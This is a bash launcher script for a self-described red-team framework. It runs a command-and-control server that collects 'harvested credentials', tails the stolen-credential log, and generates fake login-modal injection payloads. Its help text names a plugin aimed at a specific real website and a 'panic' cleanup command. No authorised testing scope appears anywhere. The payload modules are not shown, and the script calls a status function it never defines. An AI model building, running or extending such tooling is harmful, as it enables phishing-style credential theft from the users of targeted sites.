#!/bin/bash
#
# NightFury Framework - Master Control Script
# Professional Red Team Operations Platform
#
# Usage: nightfury.sh [command] [options]
#

set -e

# Configuration
NIGHTFURY_HOME="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NIGHTFURY_CONFIG="${NIGHTFURY_HOME}/config"
NIGHTFURY_LOGS="${NIGHTFURY_HOME}/logs"
NIGHTFURY_DATA="${NIGHTFURY_HOME}/data"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Functions
print_banner() {
    cat << "EOF"
    ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗   ██╗██████╗ ██╗   ██╗
    ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
    ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
    ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
    ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
    ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                        Professional Red Team Operations Framework
                                    Version 2.4 (C2-Enabled)
EOF
}

print_info() { echo -e "${BLUE}[*]${NC} $1"; }
print_success() { echo -e "${GREEN}[+]${NC} $1"; }
print_error() { echo -e "${RED}[!]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }

# Command: C2 Server
cmd_c2() {
    local action="${1:-status}"
    case "$action" in
        start)
            print_info "Starting NightFury C2 Collection Server..."
            nohup python3 "${NIGHTFURY_HOME}/core/c2_server.py" > "${NIGHTFURY_LOGS}/c2_stdout.log" 2>&1 &
            print_success "C2 Server started in background (Port 8080)"
            ;;
        stop)
            print_info "Stopping C2 Server..."
            pkill -f "python3.*c2_server.py" || true
            print_success "C2 Server stopped"
            ;;
        logs)
            print_info "Viewing harvested credentials..."
            tail -f "${NIGHTFURY_LOGS}/harvested_creds.json"
            ;;
        status)
            if pgrep -f "c2_server.py" > /dev/null; then
                print_success "C2 Server is RUNNING"
            else
                print_warning "C2 Server is STOPPED"
            fi
            ;;
        *)
            print_error "Usage: nightfury.sh c2 [start|stop|logs|status]"
            ;;
    esac
}

# Command: Injection Engine
cmd_inject() {
    local type="${1:-login_modal}"
    print_info "Generating Injection Payload: $type"
    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
    python3 -c "from modules.exploit_pro.injection_engine import InjectionEngine; e = InjectionEngine(); print(e.get_injector_script('$type'))"
}

# Command: Help
cmd_help() {
    cat << EOF
NightFury C2-Enabled - Command Reference

CORE:
  status              Show framework status
  c2 [start|stop|logs] Manage C2 Collection Server
  inject [type]       Generate Overlay/Chat Injection payloads
  runehall <cmd>      RuneHall.com Specialized Plugin
  panic               Emergency cleanup and exit

EXAMPLES:
  nightfury.sh c2 start
  nightfury.sh c2 logs
  nightfury.sh inject login_modal
EOF
}

# Main command dispatcher
main() {
    mkdir -p "${NIGHTFURY_LOGS}" "${NIGHTFURY_DATA}/exports" "${NIGHTFURY_DATA}/reports"
    local command="${1:-help}"
    shift || true
    case "$command" in
        c2) cmd_c2 "$@" ;;
        inject) cmd_inject "$@" ;;
        status) cmd_status "$@" ;;
        help|--help|-h) print_banner; cmd_help ;;
        *) print_error "Unknown command: $command"; exit 1 ;;
    esac
}

main "$@"
